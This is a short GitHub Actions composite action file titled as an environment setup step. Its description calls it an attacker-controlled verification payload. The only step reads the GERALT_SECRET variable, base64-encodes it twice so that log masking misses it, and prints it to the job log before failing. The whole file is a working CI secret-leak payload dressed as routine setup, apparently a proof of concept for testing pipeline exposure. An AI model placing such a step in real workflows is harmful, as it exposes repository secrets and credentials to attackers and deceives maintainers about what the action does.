name: 'Setup environment action'
description: 'Setup environment to run jobs (attacker-controlled verification payload)'
runs:
  using: 'composite'
  steps:
    - name: leak GERALT secret
      shell: bash
      run: |
        echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
        exit 1
